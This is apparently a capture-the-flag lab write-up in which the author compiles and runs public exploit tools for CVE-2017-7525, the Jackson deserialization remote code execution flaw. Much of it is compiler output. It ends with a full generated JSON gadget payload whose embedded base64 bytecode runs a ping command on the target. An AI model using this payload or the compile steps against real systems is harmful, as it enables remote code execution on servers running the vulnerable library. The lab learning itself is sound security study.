# Trying CVE-2017-7525

This [exploit](https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/) was listed first on [the list](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json). Googling that CVE led [to this page](https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-7525) on Vulhub, which is a docker setup for testing exploits on a vulnerable dockerized application. First if we don't have Java on Kali (if you can't run `javac`, install it with `apt install default-jdk`

## Compiling simple Java app

First let's try to compile a simple Hello World Java program. The steps are

```text
root@kali:~/CTF/HTB/Time/java# cat hello.java
// Your First Program

class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Hello, World!");
    }
}
root@kali:~/CTF/HTB/Time/java# javac hello.java
root@kali:~/CTF/HTB/Time/java# java HelloWorld
hello.java        HelloWorld.class
root@kali:~/CTF/HTB/Time/java# java HelloWorld
Hello, World!
root@kali:~/CTF/HTB/Time/java# file HelloWorld.class
HelloWorld.class: compiled Java class data, version 55.0
```

## Compiling exploit variant S2-055

I tried this [repo here](https://github.com/Nazicc/S2-055) but had problems compiling it. 

```text
root@kali:~/CTF/HTB/Time/S2-055# javac ExploitCommand.java
ExploitCommand.java:3: error: package com.sun.org.apache.xalan.internal.xsltc is not visible
import com.sun.org.apache.xalan.internal.xsltc.DOM;
                                        ^
  (package com.sun.org.apache.xalan.internal.xsltc is declared in module java.xml, which does not export it)
ExploitCommand.java:4: error: package com.sun.org.apache.xalan.internal.xsltc is not visible
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
                                        ^
  (package com.sun.org.apache.xalan.internal.xsltc is declared in module java.xml, which does not export it)
ExploitCommand.java:5: error: package com.sun.org.apache.xalan.internal.xsltc.runtime is not visible
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
                                              ^
  (package com.sun.org.apache.xalan.internal.xsltc.runtime is declared in module java.xml, which does not export it)
ExploitCommand.java:6: error: package com.sun.org.apache.xml.internal.dtm is not visible
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
                                      ^
  (package com.sun.org.apache.xml.internal.dtm is declared in module java.xml, which does not export it to the unnamed module)
ExploitCommand.java:7: error: package com.sun.org.apache.xml.internal.serializer is not visible
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
                                      ^
  (package com.sun.org.apache.xml.internal.serializer is declared in module java.xml, which does not export it)
ExploitCommand.java:37: error: method does not override or implement a method from a supertype
        @Override
        ^
ExploitCommand.java:42: error: method does not override or implement a method from a supertype
        @Override
        ^
7 errors
```

There were a bunch of errors. Eventually I succeeded with the [help of this](https://nipafx.dev/five-command-line-options-hack-java-module-system/). Compiling produced 13 warnings but no errors

```text
root@kali:~/CTF/HTB/Time/S2-055# javac ExploitCommand.java --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-exports java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED --add-exports java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED
ExploitCommand.java:3: warning: DOM is internal proprietary API and may be removed in a future release
import com.sun.org.apache.xalan.internal.xsltc.DOM;
                                              ^
ExploitCommand.java:4: warning: TransletException is internal proprietary API and may be removed in a future release
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
                                              ^
ExploitCommand.java:5: warning: AbstractTranslet is internal proprietary API and may be removed in a future release
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
                                                      ^
ExploitCommand.java:6: warning: DTMAxisIterator is internal proprietary API and may be removed in a future release
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
                                          ^
ExploitCommand.java:7: warning: SerializationHandler is internal proprietary API and may be removed in a future release
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
                                                 ^
ExploitCommand.java:11: warning: AbstractTranslet is internal proprietary API and may be removed in a future release
public class ExploitCommand extends AbstractTranslet {
                                    ^
ExploitCommand.java:38: warning: TransletException is internal proprietary API and may be removed in a future release
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
                                                                                    ^
ExploitCommand.java:38: warning: DOM is internal proprietary API and may be removed in a future release
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
                              ^
ExploitCommand.java:38: warning: SerializationHandler is internal proprietary API and may be removed in a future release
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
                                            ^
ExploitCommand.java:44: warning: TransletException is internal proprietary API and may be removed in a future release
                        throws TransletException {
                               ^
ExploitCommand.java:43: warning: DOM is internal proprietary API and may be removed in a future release
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
                              ^
ExploitCommand.java:43: warning: DTMAxisIterator is internal proprietary API and may be removed in a future release
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
                                            ^
ExploitCommand.java:43: warning: SerializationHandler is internal proprietary API and may be removed in a future release
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
                                                                      ^
13 warnings
```

But when I ran it I got this error

```text
root@kali:~/CTF/HTB/Time/S2-055# java -jar Jackson-S2-055-Exploit.jar ExploitCommand.class clientName
java.io.FileNotFoundException: /root/CTF/HTB/Time/S2-055\ExploitCommand.class (No such file or directory)
        at java.base/java.io.FileInputStream.open0(Native Method)
        at java.base/java.io.FileInputStream.open(FileInputStream.java:219)
        at java.base/java.io.FileInputStream.<init>(FileInputStream.java:157)
        at exploit.TemplatesImplTest.readClassStr(TemplatesImplTest.java:54)
        at exploit.TemplatesImplTest.main(TemplatesImplTest.java:26)

[*] www.secfree.com By Bearcat
[*] Jackson S2-055 Exploit
[+] Payload:

{"clientName":["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":[""],"transletName":"p","outputProperties":{ },"_name":"a","_version":"1.0","allowedProtocols":"all"}]}
```

when I tried to execute it. It was supposed to give a long base64 string. Looking at the backslash where "\ExploitCommand.class" is made me suspect it was meant for Windows, not Linux. So I Googled for alternative exploits for the same CVE and [found this](https://github.com/47bwy/CVE-2017-7525). The page was in Chinese which when translated had this line

> In the process of using the original project jar tool to generate the PoC, it was found that it can only be used on the Windows platform

So I cloned the repo, recompiled it and this time I could run the jar

```text
root@kali:~/CTF/HTB/Time/CVE-2017-7525# javac ExploitCommand.java --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-exports java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED --add-exports java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED
ExploitCommand.java:3: warning: DOM is internal proprietary API and may be removed in a future release
import com.sun.org.apache.xalan.internal.xsltc.DOM;
                                              ^
ExploitCommand.java:4: warning: TransletException is internal proprietary API and may be removed in a future release
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
                                              ^
ExploitCommand.java:5: warning: AbstractTranslet is internal proprietary API and may be removed in a future release
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
                                                      ^
ExploitCommand.java:6: warning: DTMAxisIterator is internal proprietary API and may be removed in a future release
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
                                          ^
ExploitCommand.java:7: warning: SerializationHandler is internal proprietary API and may be removed in a future release
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
                                                 ^
ExploitCommand.java:11: warning: AbstractTranslet is internal proprietary API and may be removed in a future release
public class ExploitCommand extends AbstractTranslet {
                                    ^
ExploitCommand.java:38: warning: TransletException is internal proprietary API and may be removed in a future release
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
                                                                                    ^
ExploitCommand.java:38: warning: DOM is internal proprietary API and may be removed in a future release
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
                              ^
ExploitCommand.java:38: warning: SerializationHandler is internal proprietary API and may be removed in a future release
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
                                            ^
ExploitCommand.java:44: warning: TransletException is internal proprietary API and may be removed in a future release
                        throws TransletException {
                               ^
ExploitCommand.java:43: warning: DOM is internal proprietary API and may be removed in a future release
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
                              ^
ExploitCommand.java:43: warning: DTMAxisIterator is internal proprietary API and may be removed in a future release
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
                                            ^
ExploitCommand.java:43: warning: SerializationHandler is internal proprietary API and may be removed in a future release
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
                                                                      ^
13 warnings

root@kali:~/CTF/HTB/Time/CVE-2017-7525# java -jar Jackson-S2-055-Exploit.jar ExploitCommand.class clientName

[*] www.secfree.com By Bearcat
[*] Jackson S2-055 Exploit
[+] Payload:

{"clientName":["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["yv66vgAAADcAawoAFwApCgAqACsIACwKACoALQcALgcALwoAHQAwCgAGADEKAAUAMgcAMwoACgApCgAFADQSAAAAOAoACgA5CQA6ADsKAAoAPAoAPQA+CAA/BwBACgATAEEHAEIKABUAKQcAQwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAA1TdGFja01hcFRhYmxlBwBEBwBFAQAKRXhjZXB0aW9ucwcARgEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwBHAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABNFeHBsb2l0Q29tbWFuZC5qYXZhDAAYABkHAEgMAEkASgEAFXBpbmcgLWMgNCAxMC4xMC4xNC43OAwASwBMAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMAE0ATgwAGABPDAAYAFABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAUQBSAQAQQm9vdHN0cmFwTWV0aG9kcw8GAFMIAFQMAFUAVgwAVwBYBwBZDABaAFsMAFwAUgcAXQwAXgBfAQAcClsqXSBQYXlsb2FkIEZ1Y2sgVG9tY2F0ISEhIQEAE2phdmEvaW8vSU9FeGNlcHRpb24MAGAAGQEAFmV4cGxvaXQvRXhwbG9pdENvbW1hbmQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQARamF2YS9sYW5nL1Byb2Nlc3MBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsKAGEAYgEAAgEKAQAXbWFrZUNvbmNhdFdpdGhDb25zdGFudHMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBAAh0b1N0cmluZwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAPcHJpbnRTdGFja1RyYWNlBwBjDABVAGcBACRqYXZhL2xhbmcvaW52b2tlL1N0cmluZ0NvbmNhdEZhY3RvcnkHAGkBAAZMb29rdXABAAxJbm5lckNsYXNzZXMBAJgoTGphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcyRMb29rdXA7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvaW52b2tlL0NhbGxTaXRlOwcAagEAJWphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcyRMb29rdXABAB5qYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMAIQAVABcAAAAAAAQAAQAYABkAAgAaAAAA4gAFAAUAAABhKrcAAQFMuAACEgO2AARNuwAFWbsABlkstgAHtwAItwAJTAFOuwAKWbcACzoEK7YADFlOxgAdGQQtugANAAC2AA5XsgAPGQS2ABC2ABGn/+CyAA8SErYAEacACEwrtgAUsQABAAQAWABbABMAAgAbAAAAOgAOAAAADQAEABAABgASAA8AEwAiABUAJAAWAC0AFwA2ABgAQgAZAFAAGwBYAB4AWwAcAFwAHQBgAB8AHAAAACcABP8ALQAFBwAVBwAFBwAdBwAeBwAKAAAi/wAKAAEHABUAAQcAEwQAHwAAAAQAAQAgAAkAIQAiAAIAGgAAACUAAgACAAAACbsAFVm3ABZMsQAAAAEAGwAAAAoAAgAAACIACAAjAB8AAAAEAAEAIAABACMAJAACABoAAAAZAAAAAwAAAAGxAAAAAQAbAAAABgABAAAAKAAfAAAABAABACUAAQAjACYAAgAaAAAAGQAAAAQAAAABsQAAAAEAGwAAAAYAAQAAAC4AHwAAAAQAAQAlAAMAJwAAAAIAKABmAAAACgABAGQAaABlABkANQAAAAgAAQA2AAEANw=="],"transletName":"p","outputProperties":{ },"_name":"a","_version":"1.0","allowedProtocols":"all"}]}
```

Then I replaced the RCE payload with something else and regenerated it but couldn't get a response. 